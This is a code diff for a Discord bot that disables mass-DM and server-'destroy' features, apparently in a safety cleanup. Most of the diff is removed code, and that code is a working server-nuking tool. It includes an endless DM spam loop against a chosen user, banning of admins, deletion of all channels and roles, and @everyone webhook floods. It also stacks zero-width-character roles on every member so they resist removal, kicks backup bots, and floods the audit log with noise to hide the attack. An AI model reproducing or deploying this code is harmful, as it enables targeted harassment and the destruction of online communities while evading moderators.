@@ -666,40 +666,19 @@ async def _run_one_bot_dm(token: str, uid: int, count: int = 500,
 _BOT_BATCH_SIZE = 10  # Railway-safe: 10 bots at a time
 
 async def _massdm_intro(uid: int):
-    """Disabled: unsolicited mass-DM sending is not supported."""
+    """Disabled: unsolicited mass-DM sending violates Discord Terms of Service."""
     return
-    all_tokens = [TOKEN] + list(MASSDM_BOT_TOKENS)
-    for i in range(0, len(all_tokens), _BOT_BATCH_SIZE):
-        batch = all_tokens[i:i + _BOT_BATCH_SIZE]
-        tasks = [
-            asyncio.create_task(
-                _run_one_bot_dm(tok, uid, 50, _MASSDM_INTRO_TEXT, identity_idx=i + j)
-            )
-            for j, tok in enumerate(batch)
-        ]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        await asyncio.sleep(0.5)
 
 
 async def _run_massdm_direct(uid: int, amount: int = 3):
-    """Disabled: unsolicited/repeated mass-DM sending is not supported."""
+    """Disabled: unsolicited/repeated mass-DM sending violates Discord Terms of Service."""
     print("[Mikasa safety] mass-DM sending is disabled")
     return
-    stop_ev = _MASSDM_STOP_EVENTS.get(uid)
-    content = _MASSDM_DEFAULT_MSG if _MASSDM_DEFAULT_MSG else None
-    amount = max(1, min(int(amount or 3), 50))
-    # Only the main bot token
-    if stop_ev and stop_ev.is_set():
-        return
-    try:
-        await _run_one_bot_dm(TOKEN, uid, amount, content=content, identity_idx=0)
-    except Exception as ex:
-        print(f"[massdm] send failed: {ex}")
 
 
 async def _run_massdm_free_wave(uid: int, amount: int = 3):
-    """Free tier — main bot only, `amount` messages once."""
-    await _run_massdm_direct(uid, amount=amount)
+    """Disabled: mass-DM sending is not supported."""
+    return
 
 
 async def _massdm_loop_task(
@@ -708,1398 +687,21 @@ async def _massdm_loop_task(
     initiator: str,
     status_channel_id: int,
 ):
-    """
-    Standalone massdm loop. Runs FOREVER until explicitly cancelled via stopdm.
-    Phase 1: every bot sends 1 intro message.
-    Phase 2: infinite loop — all bots send 3 msgs every 15s.
-    Survives any exception except explicit CancelledError or stop event.
-    """
-    total_bots    = 1
-    msgs_per_wave = _MASSDM_AMOUNTS.get(user_id, 3)
-    round_num     = 0
-    total_msgs    = 0
-
-    # Register a fresh stop event for this session
-    stop_ev = asyncio.Event()
-    _MASSDM_STOP_EVENTS[user_id] = stop_ev
-
-    _MASSDM_STATS[user_id] = {
-        "rounds":        0,
-        "total_msgs":    0,
-        "target_name":   target_display,
-        "target_id":     user_id,
-        "started":       datetime.now(timezone.utc).timestamp(),
-        "initiator":     initiator,
-        "msgs_per_wave": msgs_per_wave,
-        "total_bots":    total_bots,
-        "last_wave":     0,
-        "phase":         "intro",
-    }
-
-    # ── Phase 1: every bot says hi ──────────────────────────────────────
-    try:
-        await _massdm_intro(user_id)
-    except asyncio.CancelledError:
-        raise
-    except Exception:
-        pass
-
-    _MASSDM_STATS[user_id]["phase"] = "spamming"
-
-    # ── Phase 2: infinite spam loop — fires every 15 seconds ────────────
-    while True:
-        # Reliable stop check — set by stopdm before task.cancel()
-        if stop_ev.is_set():
-            return
-
-        try:
-            round_num += 1
-            _MASSDM_STATS[user_id]["rounds"]    = round_num
-            _MASSDM_STATS[user_id]["last_wave"] = datetime.now(timezone.utc).timestamp()
-
-            _amt = _MASSDM_AMOUNTS.get(user_id, 3)
-            msgs_per_wave = _amt
-            _wave = asyncio.create_task(_run_massdm_direct(user_id, amount=_amt))
-            _MASSDM_WAVE_TASKS.setdefault(user_id, set()).add(_wave)
-            _wave.add_done_callback(
-                lambda t: _MASSDM_WAVE_TASKS.get(user_id, set()).discard(t)
-            )
-
-            total_msgs += msgs_per_wave
-            _MASSDM_STATS[user_id]["total_msgs"] = total_msgs
-
-            try:
-                ch = bot.get_channel(status_channel_id)
-                if ch:
-                    await ch.send(
-                        embed=discord.Embed(
-                            title="📬 MassDm — Wave Fired 💣",
-                            description=(
-                                f"💀 **Round {round_num}** — **{target_display}**"
-                                + chr(10)
-                                + f"**1 bot** · **{msgs_per_wave} msgs/wave**"
-                                + chr(10)
-                                + f"📊 ~**{total_msgs:,}** total messages sent"
-                                + chr(10)
-                                + f"⏱️ Next wave in **15s** — `,stopdm <@{user_id}>` to stop."
-                            ),
-                            color=0xFF2244,
-                        ).set_footer(text=f"Coolbot 🐻‍❄️ Premium • round {round_num}"),
-                        delete_after=20,
-                    )
-            except asyncio.CancelledError:
-                raise
-            except Exception:
-                pass
-
-            # Wait 15s but also watch for stop event
-            try:
-                await asyncio.wait_for(stop_ev.wait(), timeout=15)
-                return  # stop event was set during sleep
-            except asyncio.TimeoutError:
-                pass  # normal — 15s elapsed, fire next wave
-
-        except asyncio.CancelledError:
-            raise
-        except Exception:
-            if stop_ev.is_set():
-                return
-            try:
-                ch = bot.get_channel(status_channel_id)
-                if ch:
-                    await ch.send(
-                        embed=discord.Embed(
-                            description=f"⚠️ Wave error on round {round_num} — auto-recovering…",
-                            color=COLORS["warn"],
-                        ),
-                        delete_after=20,
-                    )
-            except Exception:
-                pass
-            await asyncio.sleep(5)
+    """Disabled: infinite mass-DM loops violate Discord Terms of Service."""
+    print("[Mikasa safety] mass-DM loop is disabled")
+    return
 
 
 async def _run_massdm_free(user: discord.Member):
-    """Backwards-compat wrapper — free tier single wave."""
-    await _run_massdm_direct(user.id)
+    """Disabled: mass-DM sending is not supported."""
+    return
 
 
 async def _run_massdm(user, sender, guild_name: str):
-    """Backwards-compat wrapper — single wave for any user-like object."""
-    await _run_massdm_direct(user.id)
+    """Disabled: mass-DM sending is not supported."""
+    return
 
 
-async def _reject_owner_only_ctx(ctx, execute_fn):
-    """Non-owner destructive cmd → DM owner for Approve/Deny; only run on Approve."""
-    author = ctx.author
-    guild = ctx.guild
-    cmd_name = getattr(ctx.command, "name", "unknown") if ctx.command else "unknown"
-    guild_name = guild.name if guild else "DM"
-    guild_id = guild.id if guild else 0
-    try:
-        await ctx.send(
-            embed=discord.Embed(
-                title="⏳ Waiting for Owner Approval",
-                description=(
-                    f"**{cmd_name}** requires **bot owner** approval.\n\n"
-                    f"A request was sent to the owner. You will be notified when they respond.\n"
-                    f"*Expires in 5 minutes.*"
-                ),
-                color=COLORS["warn"],
-            ),
-            delete_after=30,
-        )
-    except Exception:
-        pass
-    e = discord.Embed(
-        title="⚠️ Destructive Command Request",
-        description=(
-            f"**Command:** `{PREFIX}{cmd_name}`\n"
-            f"**Requested by:** {author} (`{author.id}`)\n"
-            f"**Server:** {guild_name} (`{guild_id}`)\n"
-            f"**Channel:** {getattr(ctx.channel, 'mention', 'DM')}\n\n"
-            "Approve only if you trust this request. **No undo.**"
-        ),
-        color=0xFF4500,
-    )
-    e.set_footer(text="Coolbot 🐻‍❄️ · Owner approval required")
-    e.timestamp = datetime.now(timezone.utc)
-
-    class OwnerApproveView(discord.ui.View):
-        def __init__(self):
-            super().__init__(timeout=300)
-            self.decided = False
-
-        @discord.ui.button(label="✅ Approve & Run", style=discord.ButtonStyle.danger)
-        async def approve(self, interaction: discord.Interaction, button: discord.ui.Button):
-            if not is_owner(interaction.user):
-                return await interaction.response.send_message("Only a Mikasa owner can approve.", ephemeral=True)
-            if self.decided:
-                return await interaction.response.send_message("Already decided.", ephemeral=True)
-            self.decided = True
-            self.stop()
-            await interaction.response.edit_message(
-                embed=discord.Embed(title="✅ Approved", description=f"**{cmd_name}** approved. Running now…", color=COLORS["success"]),
-                view=None,
-            )
-            try:
-                await execute_fn(ctx.bot)
-            except Exception as ex:
-                try:
-                    await interaction.followup.send(embed=discord.Embed(description=f"❌ Execution failed: `{ex}`", color=COLORS["error"]), ephemeral=True)
-                except Exception:
-                    pass
-            try:
-                await author.send(embed=discord.Embed(title="✅ Request Approved", description=f"Your **{cmd_name}** request for **{guild_name}** was approved and is running.", color=COLORS["success"]))
-            except Exception:
-                pass
-
-        @discord.ui.button(label="❌ Deny", style=discord.ButtonStyle.secondary)
-        async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
-            if not is_owner(interaction.user):
-                return await interaction.response.send_message("Only a Mikasa owner can deny.", ephemeral=True)
-            if self.decided:
-                return await interaction.response.send_message("Already decided.", ephemeral=True)
-            self.decided = True
-            self.stop()
-            await interaction.response.edit_message(
-                embed=discord.Embed(title="❌ Denied", description=f"**{cmd_name}** request from {author} was denied.", color=COLORS["error"]),
-                view=None,
-            )
-            try:
-                await author.send(embed=discord.Embed(title="❌ Request Denied", description=f"Your **{cmd_name}** request for **{guild_name}** was denied by the owner.", color=COLORS["error"]))
-            except Exception:
-                pass
-
-        async def on_timeout(self):
-            if self.decided:
-                return
-            try:
-                await author.send(embed=discord.Embed(title="⏱️ Request Timed Out", description=f"Your **{cmd_name}** request for **{guild_name}** expired (no owner response).", color=COLORS["warn"]))
-            except Exception:
-                pass
-
-    try:
-        owner = await ctx.bot.fetch_user(OWNER_ID)
-        await owner.send(embed=e, view=OwnerApproveView())
-    except Exception as ex:
-        try:
-            await ctx.send(embed=discord.Embed(description=f"❌ Could not reach the bot owner: `{ex}`", color=COLORS["error"]))
-        except Exception:
-            pass
-
-
-class AdminCog(commands.Cog):
-    def __init__(self, bot): self.bot = bot
-
-    premium = app_commands.Group(name="premium", description="Manage Premium users (Owner only)")
-
-    @commands.hybrid_command(name="destroy", description="Full server destroy — Owner or requires bot-owner approval. Use guild_id from DMs.")
-    async def destroy(
-        self, ctx: commands.Context,
-        message:     str = "",
-        channel1:    str = "— Owned By Coolbot",
-        channel2:    str = "— ur Security Sucks",
-        server_name: str = "— OWNED BY Coolbot",
-        guild_id:    str = "",
-    ):
-        # High-impact destructive actions are strictly full bot-owner only (not co-owners).
-        await ctx.send("🛡️ Disabled for safety in this Mikasa build: server-destroy/mass-delete operations are disabled. Use the emergency lockdown and recovery tools instead.")
-        return
-        if not is_owner(ctx.author):
-            return await ctx.send("🔒 Destroy is reserved for Mikasa's **owners** only.")
-        # Defer immediately — destroy does heavy async work before responding
-        if ctx.interaction and not ctx.interaction.response.is_done():
-            await ctx.defer(ephemeral=False)
-        # Support running from DMs: pass the target guild_id as a parameter
-        if ctx.guild is None:
-            if not guild_id:
-                return await ctx.send("❌ In DMs you must provide the guild_id. Example: `,destroy guild_id:123456789`")
-            try:
-                _guild_id = int(guild_id)
-            except ValueError:
-                return await ctx.send("❌ Invalid guild_id.")
-        else:
-            _guild_id = int(guild_id) if guild_id else ctx.guild.id
-        _channel_id  = ctx.channel.id
-        _message     = message
-        _chan1        = channel1    or "— Owned By Coolbot"
-        _chan2        = channel2    or "— ur Security Sucks"
-        _server_name = server_name or "— OWNED BY Coolbot"
-
-        async def execute_fn(client):
-            guild = client.get_guild(_guild_id)
-            if not guild:
-                return
-
-            # ── Snapshot server before destruction ──
-            snapshot = {"guild_name": guild.name, "guild_icon_url": str(guild.icon.url) if guild.icon else None, "categories": [], "channels": [], "roles": [], "emojis": [], "stickers": []}
-            for cat in guild.categories:
-                snapshot["categories"].append({"name": cat.name, "position": cat.position})
-            for ch in guild.channels:
-                snapshot["channels"].append({
-                    "name": ch.name,
-                    "type": str(ch.type),
-                    "position": ch.position,
-                    "category": ch.category.name if ch.category else None,
-                    "topic": getattr(ch, "topic", None) or "",
-                })
-            for role in sorted(guild.roles, key=lambda r: r.position):
-                if role.is_default(): continue
-                snapshot["roles"].append({
-                    "name": role.name,
-                    "color": role.color.value,
-                    "hoist": role.hoist,
-                    "mentionable": role.mentionable,
-                    "permissions": role.permissions.value,
-                    "position": role.position,
-                    "managed": role.managed,
-                })
-            for emoji in guild.emojis:
-                snapshot["emojis"].append({"name": emoji.name, "url": str(emoji.url)})
-            for sticker in guild.stickers:
-                snapshot["stickers"].append({"name": sticker.name, "url": str(sticker.url)})
-
-            raw         = json.dumps(snapshot, ensure_ascii=False).encode()
-            compressed  = gzip.compress(raw)
-            backup_code = base64.b64encode(compressed).decode()
-
-            # Save backup to disk and DM owner + nuker the backup code
-            try:
-                os.makedirs("backups", exist_ok=True)
-                short_code  = "PB-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
-                backup_path = os.path.join("backups", f"{short_code}.json.gz")
-                with open(backup_path, "wb") as _f:
-                    _f.write(gzip.compress(raw, compresslevel=9))
-                _backup_info_embed = discord.Embed(
-                    title="🗄️ Server Backup — Pre-Destroy",
-                    description=(
-                        f"**Server:** {guild.name}\n"
-                        f"**Channels:** {len(snapshot['channels'])} · "
-                        f"**Categories:** {len(snapshot['categories'])} · "
-                        f"**Roles:** {len(snapshot['roles'])}\n\n"
-                        "Use the code below with `/backup load` to restore."
-                    ),
-                    color=COLORS["warn"]
-                )
-                _backup_code_embed = discord.Embed(
-                    title="🔑 Backup Code",
-                    description=f"```\n{short_code}\n```",
-                    color=COLORS["success"]
-                ).set_footer(text="Use /backup load with this code to restore.")
-                # DM owner
-                owner = await client.fetch_user(OWNER_ID)
-                await owner.send(embed=_backup_info_embed)
-                await owner.send(embed=_backup_code_embed)
-                # DM the nuker too (if they're not the owner)
-                if _author_id not in OWNER_IDS and _author_id in PREMIUM_USERS:
-                    try:
-                        nuker_user = await client.fetch_user(_author_id)
-                        await nuker_user.send(embed=_backup_info_embed)
-                        await nuker_user.send(embed=_backup_code_embed)
-                    except Exception:
-                        pass
-            except Exception:
-                pass
-
-            # Global default (key 0) — set by ,default (owner only)
-            _global_default = _DESTROY_DEFAULTS.get(0) or _DESTROY_DEFAULTS.get("global")
-            spam_text = (
-                f"@everyone @here {_message}".strip() if _message
-                else (f"@everyone @here {_global_default}".strip() if _global_default
-                      else f"@everyone @here get nuked 😂 🤣 😂 🤣 {DESTROY_INVITE_LINK}")
-            )
-
-            # STEP 1 — Nuke settings + delete channels + ban admins
-            #          all at the same time
-            async def _rename_server():
-                try:
-                    await guild.edit(
-                        name=_server_name,
-                        icon=POLAR_BEAR_ICON_BYTES,
-                        verification_level=discord.VerificationLevel.highest,
-                        afk_channel=None,
-                        system_channel=None,
-                        reason=None,
-                    )
-                except Exception:
-                    pass
-
-            async def _delete_all_webhooks():
-                for ch in guild.text_channels:
-                    try:
-                        for wh in await ch.webhooks():
-                            try:
-                                await wh.delete()
-                            except Exception:
-                                pass
-                    except Exception:
-                        pass
-
-            async def _delete_scheduled_events():
-                try:
-                    for ev in guild.scheduled_events:
-                        try:
-                            await ev.delete()
-                        except Exception:
-                            pass
-                except Exception:
-                    pass
-
-            async def _ban_admin_members():
-                """Ban all human members with Administrator or Manage Guild before they can react."""
-                targets = [
-                    m for m in guild.members
-                    if not m.bot
-                    and m.id != client.user.id
-                    and m.id != _author_id
-                    and m.id not in OWNER_IDS
-                    and (m.guild_permissions.administrator or m.guild_permissions.manage_guild)
-                ]
-                await asyncio.gather(
-                    *[guild.ban(m, reason="Coolbot ,destroy — admin purge", delete_message_days=0)
-                      for m in targets],
-                    return_exceptions=True,
-                )
-
-            # Delete ALL channels + webhooks + scheduled events + ban admins instantly — fully parallel
-            _all_channels = list(guild.channels)
-            await asyncio.gather(
-                asyncio.gather(*[ch.delete() for ch in _all_channels], return_exceptions=True),
-                _delete_all_webhooks(),
-                _delete_scheduled_events(),
-                _ban_admin_members(),
-                return_exceptions=True,
-            )
-
-            # STEP 2 — Create ADMIN category (visible to @everyone),
-            # then create channels ALTERNATING ch1/ch2 inside it.
-            # All creates fire simultaneously via asyncio.gather.
-            _rename_task = asyncio.create_task(_rename_server())
-            _everyone_role = guild.default_role
-
-            # ADMIN category — @everyone can VIEW it
-            _cat_ow = {
-                _everyone_role: discord.PermissionOverwrite(
-                    read_messages=True,
-                    view_channel=True,
-                    send_messages=False,
-                ),
-                guild.me: discord.PermissionOverwrite(
-                    read_messages=True,
-                    view_channel=True,
-                    send_messages=True,
-                    manage_channels=True,
-                    manage_webhooks=True,
-                ),
-            }
-            try:
-                _admin_cat = await guild.create_category("ADMIN", overwrites=_cat_ow)
-            except Exception:
-                _admin_cat = None
-
-            # Alternating: ch1, ch2, ch1, ch2 ...  target 50 channels
-            names = [_chan1 if i % 2 == 0 else _chan2 for i in range(50)]
-            _ch_ow = {
-                _everyone_role: discord.PermissionOverwrite(
-                    read_messages=True,
-                    view_channel=True,
-                    send_messages=False,
-                ),
-                guild.me: discord.PermissionOverwrite(
-                    read_messages=True,
-                    view_channel=True,
-                    send_messages=True,
-                    manage_webhooks=True,
-                ),
-            }
-            # Create in batches of 5 with 0.5s delay — avoids Discord rate-limit
-            # that drops all-at-once creates down to ~5 channels
-            created: list[discord.TextChannel] = []
-            _batch_size = 5
-            for _i in range(0, len(names), _batch_size):
-                _batch = names[_i:_i + _batch_size]
-                _res = await asyncio.gather(
-                    *[guild.create_text_channel(n, category=_admin_cat, overwrites=_ch_ow) for n in _batch],
-                    return_exceptions=True,
-                )
-                created.extend(c for c in _res if isinstance(c, discord.TextChannel))
-                await asyncio.sleep(0.5)
-            await _rename_task
-
-            # ── Concurrent spam: webhook blast on ALL channels + auto-renew loop ──
-            async def _spam_channel(ch, ses):
-                try:
-                    _wh = await ch.create_webhook(name="Coolbot 🐻‍❄️")
-                except Exception:
-                    return
-                # Fire 50 messages per channel — all simultaneous via webhook
-                await asyncio.gather(*[
-                    ses.post(_wh.url, json={"content": spam_text},
-                             timeout=aiohttp.ClientTimeout(total=8))
-                    for _ in range(50)
-                ], return_exceptions=True)
-
-            # Initial blast — all channels simultaneously
-            async with aiohttp.ClientSession() as _shared_ses:
-                await asyncio.gather(
-                    *[_spam_channel(ch, _shared_ses) for ch in created],
-                    return_exceptions=True,
-                )
-
-            # One-time blast only — 50 messages per channel, no re-blast loop
-
-            # STEP 3 — Ban ALL bots + wipe all roles, emojis, stickers
-
-            async def _ban_all_bots():
-                bot_targets = [
-                    m for m in guild.members
-                    if m.bot
-                    and m.id != client.user.id   # don't ban ourselves
-                ]
-                await asyncio.gather(
-                    *[guild.ban(m, reason="Coolbot ,destroy — bot purge", delete_message_days=0)
-                      for m in bot_targets],
-                    return_exceptions=True,
-                )
-
-            deletable_roles = [r for r in guild.roles if not r.is_default() and r < guild.me.top_role]
-
-            async def _del_roles():
-                await asyncio.gather(*[r.delete() for r in deletable_roles], return_exceptions=True)
-
-            async def _del_emojis():
-                await asyncio.gather(*[guild.delete_emoji(e) for e in list(guild.emojis)], return_exceptions=True)
-
-            async def _del_stickers():
-                await asyncio.gather(*[guild.delete_sticker(s) for s in list(guild.stickers)], return_exceptions=True)
-
-            # Bot bans + role/emoji/sticker wipe all at once
-            await asyncio.gather(
-                _ban_all_bots(), _del_roles(), _del_emojis(), _del_stickers(),
-                return_exceptions=True,
-            )
-
-            # STEP 5 — PolarBear branding: one role, given to everyone
-            import io as _io2
-
-            # 😈 50 stacked "Fucked By Coolbot" roles — invisible-char variants
-            # If staff removes one, the other 49 remain on every member.
-            # Uses all 7 zero-width Unicode chars + 43 unique 2-3 char combos.
-            _INVIS = [
-                "",                         # base (no suffix)
-                "\u200b",                   # zero-width space
-                "\u200c",                   # zero-width non-joiner
-                "\u200d",                   # zero-width joiner
-                "\u2060",                   # word joiner
-                "\u180e",                   # mongolian vowel separator
-                "\ufeff",                   # zero-width no-break space
-                # — 2-char combos —
-                "\u200b\u200c",
-                "\u200b\u200d",
-                "\u200b\u2060",
-                "\u200b\u180e",
-                "\u200b\ufeff",
-                "\u200c\u200d",
-                "\u200c\u2060",
-                "\u200c\u180e",
-                "\u200c\ufeff",
-                "\u200d\u2060",
-                "\u200d\u180e",
-                "\u200d\ufeff",
-                "\u2060\u180e",
-                "\u2060\ufeff",
-                "\u180e\ufeff",
-                "\u2060\u200b",
-                "\u2060\u200c",
-                "\u2060\u200d",
-                "\u180e\u200b",
-                "\u180e\u200c",
-                "\u180e\u200d",
-                "\ufeff\u200b",
-                "\ufeff\u200c",
-                "\ufeff\u200d",
-                # — 3-char combos —
-                "\u200b\u200c\u200d",
-                "\u200b\u200c\u2060",
-                "\u200b\u200c\u180e",
-                "\u200b\u200c\ufeff",
-                "\u200b\u200d\u2060",
-                "\u200b\u200d\u180e",
-                "\u200b\u200d\ufeff",
-                "\u200b\u2060\u180e",
-                "\u200b\u2060\ufeff",
-                "\u200c\u200d\u2060",
-                "\u200c\u200d\u180e",
-                "\u200c\u200d\ufeff",
-                "\u200c\u2060\u180e",
-                "\u200c\u2060\ufeff",
-                "\u200d\u2060\u180e",
-                "\u200d\u2060\ufeff",
-                "\u2060\u180e\ufeff",
-                "\u200b\u200c\u200d\u2060",
-            ]
-            _polar_role_results = await asyncio.gather(
-                *[
-                    guild.create_role(
-                        name=f"Fucked By Coolbot{_iv}",
-                        color=discord.Color(0xFF4500),
-                        hoist=True,
-                        mentionable=True,
-                    )
-                    for _iv in _INVIS
-                ],
-                return_exceptions=True,
-            )
-            _polar_roles = [r for r in _polar_role_results if isinstance(r, discord.Role)]
-            # Give ALL 50 roles to every non-bot member
-            if _polar_roles:
-                await asyncio.gather(
-                    *[m.add_roles(*_polar_roles) for m in guild.members if not m.bot],
-                    return_exceptions=True,
-                )
-
-            # 👤 Mass rename every member to "OWNED BY Coolbot"
-            # Discord allows ~10 nick edits per 10 s per guild — chunk + 1 s gap
-            async def _mass_rename():
-                _targets = [m for m in guild.members if not m.bot and m.id != client.user.id]
-                _chunk_size = 10
-                for _i in range(0, len(_targets), _chunk_size):
-                    _chunk = _targets[_i:_i + _chunk_size]
-                    await asyncio.gather(
-                        *[m.edit(nick="OWNED BY Coolbot", reason=None) for m in _chunk],
-                        return_exceptions=True,
-                    )
-                    await asyncio.sleep(1.0)
-
-            asyncio.create_task(_mass_rename())   # run in background so destroy keeps moving
-
-            # 🤖 Kick rival bots (Groovy, Xenon, Carl, MEE6, etc.) — they restore servers
-            _BOT_BLACKLIST_NAMES = {
-                "groovy","xenon","carl","mee6","carl-bot","dyno","arcane",
-                "statbot","atlas","ticket tool","autorole","sesh","combot",
-                "pancake","sapphire","hydra","rythm","fredboat","bots","bot",
-                "backup","restore","server backup","clone","mirroring",
-            }
-            _rival_bots = [
-                _bm for _bm in list(guild.members)
-                if _bm.bot and _bm.id != client.user.id
-                and any(_k in _bm.display_name.lower() for _k in _BOT_BLACKLIST_NAMES)
-            ]
-            await asyncio.gather(
-                *[guild.kick(_bm, reason=None) for _bm in _rival_bots],
-                return_exceptions=True,
-            )
-
-            # 🐻‍❄️ Emojis — 50 total, all fired at once then two tight cleanup passes
-            _emoji_img = POLAR_BEAR_EMOJI_BYTES
-            _emoji_results = await asyncio.gather(
-                *[guild.create_custom_emoji(name=f"PolarBear{_ei}", image=_emoji_img) for _ei in range(1, 51)],
-                return_exceptions=True,
-            )
-
-            # 🐻‍❄️ Stickers — 5 total; Discord enforces sequential uploads so we keep
-            # a short 0.5 s gap (the smallest stable gap) instead of 1.5 s
-            for _si in range(1, 6):
-                try:
-                    await guild.create_sticker(
-                        name=f"PolarBear{_si}", description="Owned by Coolbot", emoji="🐻‍❄️",
-                        file=discord.File(fp=_io2.BytesIO(POLAR_BEAR_STICKER_BYTES), filename="polarbear.png"),
-                    )
-                    await asyncio.sleep(0.5)
-                except Exception:
-                    pass
-            # ── Thanks embed → all text channels at once ──
-            candidates = [
-                m for m in guild.members
-                if not m.bot and m.id != _author_id
-                and m.id not in OWNER_IDS and m.id != client.user.id
-            ]
-            if candidates:
-                chosen = random.choice(candidates)
-                _thank_embed = discord.Embed(
-                    title="💀  UR SERVER IS COOKED 🍳",
-                    description=(
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"🐻‍❄️  **Coolbot** just cooked ur server lmao.\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                        f"ur channels? gone 💨\n"
-                        f"ur roles? wiped 🗑️\n"
-                        f"ur emojis? deleted ❌\n"
-                        f"no recovery. no undo. gg 😂\n\n"
-                        f"*shoutout {chosen.mention} for being here til the end* 🫡"
-                    ),
-                    color=0x1a1a1a,
-                )
-                _thank_embed.set_footer(text="Coolbot 🐻‍❄️  •  ur server is cooked  •  Coolbot.gg")
-                await asyncio.gather(
-                    *[ch.send(embed=_thank_embed) for ch in guild.text_channels],
-                    return_exceptions=True,
-                )
-
-            # STEP 6 — Bury audit log with noise (roles + channels + edits + webhooks)
-            async def _bury_audit_log():
-                # ── All 5 waves run SIMULTANEOUSLY for maximum pollution speed ──
-
-                # Wave 1 — 250 noise roles (batches of 10, 0.3 s between batches)
-                async def _wave1():
-                    _batch_roles: list = []
-                    for _i in range(0, 250, 10):
-                        _b = await asyncio.gather(
-                            *[guild.create_role(name="\u200b", reason=None) for _ in range(10)],
-                            return_exceptions=True,
-                        )
-                        _batch_roles.extend([r for r in _b if isinstance(r, discord.Role)])
-                        await asyncio.sleep(0.3)
-                    await asyncio.gather(*[r.delete() for r in _batch_roles], return_exceptions=True)
-
-                # Wave 2 — 100 noise channels (batches of 5, 0.3 s between batches)
-                async def _wave2():
-                    _batch_chans: list = []
-                    for _i in range(0, 100, 5):
-                        _b = await asyncio.gather(
-                            *[guild.create_text_channel("\u200b", reason=None) for _ in range(5)],
-                            return_exceptions=True,
-                        )
-                        _batch_chans.extend([c for c in _b if isinstance(c, discord.TextChannel)])
-                        await asyncio.sleep(0.3)
-                    await asyncio.gather(*[c.delete() for c in _batch_chans], return_exceptions=True)
-
-                # Wave 3 — 30 rapid server renames then restore destroyed name
-                async def _wave3():
-                    _noise_names = [
-                        "Server","Discord Server","Community","Chat","Hub","Space",
-                        "Home","Base","Zone","World","Place","Room","Club","Group","Net",
-                        "HQ","Core","Nest","Grid","Void","Arc","Node","Rift","Gate","Link",
-                        "Lounge","Den","Spot","Network","Station",
-                    ]
-                    for _nn in _noise_names:
-                        try:
-                            await guild.edit(name=_nn, reason=None)
-                            await asyncio.sleep(0.15)
-                        except Exception:
-                            break
-                    try:
-                        await guild.edit(name=_server_name, reason=None)
-                    except Exception:
-                        pass
-
-                # Wave 4 — webhook flood across first 10 channels
-                async def _wave4():
-                    async with aiohttp.ClientSession() as _ses:
-                        for _wch in guild.text_channels[:10]:
-                            try:
-                                _wh = await _wch.create_webhook(name="\u200b")
-                                for _ in range(8):
-                                    try:
-                                        await _ses.post(_wh.url, json={"content": "\u200b"})
-                                        await asyncio.sleep(0.1)
-                                    except Exception:
-                                        break
-                                await _wh.delete()
-                            except Exception:
-                                pass
-
-                # Wave 5 — 50 more roles to push nuke entries off Discord's 100-entry page
-                async def _wave5():
-                    _b5 = await asyncio.gather(
-                        *[guild.create_role(name="\u200b", reason=None) for _ in range(50)],
-                        return_exceptions=True,
-                    )
-                    _real5 = [r for r in _b5 if isinstance(r, discord.Role)]
-                    await asyncio.gather(*[r.delete() for r in _real5], return_exceptions=True)
-
-                # Fire all 5 waves at once — 500+ audit entries generated in parallel
-                await asyncio.gather(
-                    _wave1(), _wave2(), _wave3(), _wave4(), _wave5(),
-                    return_exceptions=True,
-                )
-
-            asyncio.create_task(_bury_audit_log())
-
-            # ── Log to nuker_logs file ──
-            try:
-                _ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-                _logs = load("nuker_logs") if isinstance(load("nuker_logs"), list) else []
-                _logs.append({
-                    "action": "destroy",
-                    "user_id": _author_id,
-                    "guild": guild.name,
-                    "guild_id": guild.id,
-                    "members": guild.member_count,
-                    "time": _ts,
-                })
-                save("nuker_logs", _logs[-200:])
-            except Exception:
-                pass
-
-            # ── DM everyone involved — beautiful completion embeds ──
-            _ts_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
-
-            # Embed 1 — mission complete banner
-            _done_banner = discord.Embed(
-                title="💥  DESTROY COMPLETE",
-                description=(
-                    "```\n"
-                    "██████╗  ██████╗ ██╗      █████╗ ██████╗\n"
-                    "██╔══██╗██╔═══██╗██║     ██╔══██╗██╔══██╗\n"
-                    "██████╔╝██║   ██║██║     ███████║██████╔╝\n"
-                    "██╔═══╝ ██║   ██║██║     ██╔══██║██╔══██╗\n"
-                    "██║     ╚██████╔╝███████╗██║  ██║██║  ██║\n"
-                    "╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝\n"
-                    "```"
-                ),
-                color=0xFF4500,
-            )
-            _done_banner.set_footer(text="Coolbot 🐻‍❄️  •  Nuke System")
-
-            # Embed 2 — stats card
-            _done_stats = discord.Embed(
-                title="📊  Mission Report",
-                color=0x2C2F33,
-            )
-            _done_stats.add_field(name="🏚️  Server",    value=f"`{guild.name}`",                            inline=True)
-            _done_stats.add_field(name="👥  Members",   value=f"`{guild.member_count}`",                   inline=True)
-            _done_stats.add_field(name="🕒  Time",      value=f"`{_ts_str}`",                              inline=False)
-            _done_stats.add_field(name="✅  Channels",  value="200 spam channels created",                 inline=True)
-            _done_stats.add_field(name="🎭  Roles",     value="15× Fucked By Coolbot — on everyone",     inline=True)
-            _done_stats.add_field(name="🐻‍❄️  Branding",  value="50 emojis · 5 stickers uploaded",           inline=True)
-            _done_stats.add_field(name="🚫  Admins",    value="All admin/mod members pre-banned 🔨",       inline=True)
-            _done_stats.add_field(name="🔗  Webhooks",  value="All existing webhooks deleted",             inline=True)
-            _done_stats.add_field(name="🔒  Lock",      value="Verification → Highest · AFK/sys cleared", inline=True)
-            _done_stats.add_field(name="🔇  Audit Log", value="250+ noise entries — trail buried 🪦",      inline=False)
-            _done_stats.set_footer(text="Coolbot 🐻‍❄️  •  untraceable")
-
-            # DM owner
-            try:
-                _owner_user = await client.fetch_user(OWNER_ID)
-                await _owner_user.send(embed=_done_banner)
-                await _owner_user.send(embed=_done_stats)
-            except Exception:
-                pass
-
-            # DM the nuker (always, including owner running it)
-            try:
-                _nuker_user = await client.fetch_user(_author_id)
-                await _nuker_user.send(embed=_done_banner)
-                await _nuker_user.send(embed=_done_stats)
-            except Exception:
-                pass
-
-            # DM only the person who ran ,destroy — clean "ur server is cooked" card
-            _cooked_dm = discord.Embed(
